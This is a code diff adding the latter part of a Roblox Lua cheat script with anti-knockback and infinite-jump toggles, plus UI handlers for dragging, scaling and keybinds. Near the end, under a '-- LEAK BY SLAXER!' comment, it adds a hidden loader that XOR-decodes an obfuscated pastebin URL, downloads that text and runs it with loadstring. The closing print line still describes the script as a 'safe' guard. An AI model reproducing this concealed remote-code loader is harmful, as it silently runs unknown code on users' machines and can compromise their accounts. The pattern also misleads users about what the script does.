+    if version ~= 1 and version ~= 2 then return end
+    state.LogicVersion = version
+    if updateLogicUI then updateLogicUI() end
+    saveConfig()
+end
+
+local function setScale(value)
+    state.UIScale = clamp(value, 0.75, 1.6)
+    uiScale.Scale = state.UIScale
+    if updateScaleUI then updateScaleUI() end
+    saveConfig()
+end
+
+updateLogicUI = function()
+    mobileLogic.Text = "LOGIC  ·  V" .. state.LogicVersion
+    pcV1.BackgroundColor3 = state.LogicVersion == 1 and C.v1 or C.card
+    pcV2.BackgroundColor3 = state.LogicVersion == 2 and C.v2 or C.card
+    pcV1Stroke.Transparency = state.LogicVersion == 1 and 0.1 or 0.5
+    pcV2Stroke.Transparency = state.LogicVersion == 2 and 0.1 or 0.5
+end
+
+updateAntiUI = function()
+    local label = state.AntiBat and "ON" or "OFF"
+    mobileAnti.Text = "ANTI BAT  ·  " .. label
+    mobileAnti.BackgroundColor3 = state.AntiBat and C.accent or C.card
+    antiStatus.Text = label
+    antiStatus.TextColor3 = state.AntiBat and C.on or C.muted
+    antiTrack.BackgroundColor3 = state.AntiBat and C.accent or C.dark
+    local x = state.AntiBat and (antiTrackW - antiKnobSize - 3) or 3
+    tween(antiKnob, { Position = UDim2.new(0, x, 0.5, -antiKnobSize / 2) })
+    miniBat.Text = state.AntiBat and "BAT ON" or "BAT OFF"
+    miniBat.BackgroundColor3 = state.AntiBat and C.accent or C.card
+end
+
+updateInfUI = function()
+    local label = state.InfJump and "ON" or "OFF"
+    mobileInf.Text = "INF JUMP  ·  " .. label
+    mobileInf.BackgroundColor3 = state.InfJump and C.accent or C.card
+    infStatus.Text = label
+    infStatus.TextColor3 = state.InfJump and C.on or C.muted
+    infTrack.BackgroundColor3 = state.InfJump and C.accent or C.dark
+    local x = state.InfJump and (infTrackW - infKnobSize - 3) or 3
+    tween(infKnob, { Position = UDim2.new(0, x, 0.5, -infKnobSize / 2) })
+end
+
+updateKeyUI = function()
+    local name = bindingKey and "..." or state.Keybind.Name
+    pcKey.Text = name
+    pcKey.TextColor3 = bindingKey and C.accent2 or C.white
+    mobileKey.Text = "KEY  ·  " .. name
+end
+
+updateLockUI = function()
+    local glyph = state.Locked and "🔒" or "🔓"
+    lockBtn.Text = glyph
+    miniLock.Text = glyph
+    lockBtn.TextColor3 = state.Locked and C.accent2 or C.white
+    miniLock.TextColor3 = state.Locked and C.accent2 or C.white
+end
+
+updateModeUI = function()
+    pcContent.Visible = not state.MobileMode
+    mobileContent.Visible = state.MobileMode
+    modeBtn.Text = state.MobileMode and "PC" or "MOB"
+end
+
+updateScaleUI = function()
+    local text = string.format("%.0f%%", state.UIScale * 100)
+    mobilePercent.Text = text
+    pcPercent.Text = text
+end
+
+setCollapsed = function(collapsed)
+    state.Collapsed = collapsed and true or false
+    if state.Collapsed then
+        main.Size = UDim2.new(0, 168, 0, 52)
+        header.Visible = false
+        topLine.Visible = false
+        content.Visible = false
+        miniBar.Visible = true
+    else
+        main.Size = UDim2.new(0, 310, 0, 340)
+        header.Visible = true
+        topLine.Visible = true
+        content.Visible = true
+        miniBar.Visible = false
+    end
+end
+
+local function toggleLocked()
+    state.Locked = not state.Locked
+    updateLockUI()
+end
+
+local function beginKeyBind()
+    bindingKey = true
+    updateKeyUI()
+end
+
+local function toggleAntiFromUI()
+    setAntiBat(not state.AntiBat)
+end
+
+local function toggleInfFromUI()
+    setInfJump(not state.InfJump)
+end
+
+local function cycleLogic()
+    setLogicVersion(state.LogicVersion == 1 and 2 or 1)
+end
+
+mobileLogic.MouseButton1Click:Connect(cycleLogic)
+mobileAnti.MouseButton1Click:Connect(toggleAntiFromUI)
+mobileInf.MouseButton1Click:Connect(toggleInfFromUI)
+mobileKey.MouseButton1Click:Connect(beginKeyBind)
+mobileMinus.MouseButton1Click:Connect(function() setScale(state.UIScale - 0.1) end)
+mobilePlus.MouseButton1Click:Connect(function() setScale(state.UIScale + 0.1) end)
+
+pcV1.MouseButton1Click:Connect(function() setLogicVersion(1) end)
+pcV2.MouseButton1Click:Connect(function() setLogicVersion(2) end)
+antiHit.MouseButton1Click:Connect(toggleAntiFromUI)
+infHit.MouseButton1Click:Connect(toggleInfFromUI)
+pcKey.MouseButton1Click:Connect(beginKeyBind)
+pcMinus.MouseButton1Click:Connect(function() setScale(state.UIScale - 0.1) end)
+pcPlus.MouseButton1Click:Connect(function() setScale(state.UIScale + 0.1) end)
+
+lockBtn.MouseButton1Click:Connect(toggleLocked)
+miniLock.MouseButton1Click:Connect(toggleLocked)
+swapBtn.MouseButton1Click:Connect(function() setCollapsed(not state.Collapsed) end)
+miniExpand.MouseButton1Click:Connect(function() setCollapsed(false) end)
+miniBat.MouseButton1Click:Connect(toggleAntiFromUI)
+modeBtn.MouseButton1Click:Connect(function()
+    state.MobileMode = not state.MobileMode
+    updateModeUI()
+    saveConfig()
+end)
+
+track(UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.UserInputType == Enum.UserInputType.Keyboard then
+        if bindingKey then
+            if input.KeyCode ~= Enum.KeyCode.Unknown then
+                state.Keybind = input.KeyCode
+                bindingKey = false
+                updateKeyUI()
+                saveConfig()
+            end
+            return
+        end
+        if not gameProcessed and input.KeyCode == state.Keybind then
+            setCollapsed(not state.Collapsed)
+            return
+        end
+        if not gameProcessed and input.KeyCode == Enum.KeyCode.Space then
+            spaceHeld = true
+        end
+    end
+end))
+
+track(UserInputService.InputEnded:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.Space then
+        spaceHeld = false
+    end
+end))
+
+header.InputBegan:Connect(function(input)
+    if state.Locked then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPosition = main.Position
+    end
+end)
+
+track(UserInputService.InputChanged:Connect(function(input)
+    if not dragging or state.Locked then return end
+    if input.UserInputType ~= Enum.UserInputType.MouseMovement
+        and input.UserInputType ~= Enum.UserInputType.Touch then
+        return
+    end
+    local delta = input.Position - dragStart
+    main.Position = UDim2.new(
+        startPosition.X.Scale,
+        startPosition.X.Offset + delta.X,
+        startPosition.Y.Scale,
+        startPosition.Y.Offset + delta.Y
+    )
+end))
+
+track(UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end))
+
+-- Initial paint.
+updateLogicUI()
+updateAntiUI()
+updateInfUI()
+updateKeyUI()
+updateLockUI()
+updateModeUI()
+updateScaleUI()
+setCollapsed(false)
+
+if state.AntiBat then
+    startGuard()
+end
+
+local function cleanup()
+    stopGuard()
+    for _, conn in ipairs(connections) do
+        pcall(function() conn:Disconnect() end)
+    end
+end
+
+gui.Destroying:Connect(cleanup)
+
+-- LEAK BY SLAXER!
+task.spawn(function()
+    local function _xorDecode(s)
+        local t = {}
+        for i = 1, #s do
+            local b = string.byte(s, i)
+            local x
+            if bit32 and type(bit32.bxor) == "function" then
+                x = bit32.bxor(b, 23)
+            else
+                local r, bit, a, c = 0, 1, b, 23
+                while a > 0 or c > 0 do
+                    local ab, cb = a % 2, c % 2
+                    if ab ~= cb then r = r + bit end
+                    a = math.floor(a / 2)
+                    c = math.floor(c / 2)
+                    bit = bit * 2
+                end
+                x = r
+            end
+            t[i] = string.char(x)
+        end
+        return table.concat(t)
+    end
+    local ok, src = pcall(function()
+        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
+    end)
+    if ok and type(src) == "string" and #src > 50 then
+        local fn = loadstring(src)
+        if type(fn) == "function" then
+            pcall(fn)
+        end
+    end
+end)
+
+print("[Mouad Anti Bat] real-ui reconstruction loaded · safe anti-knockback guard")
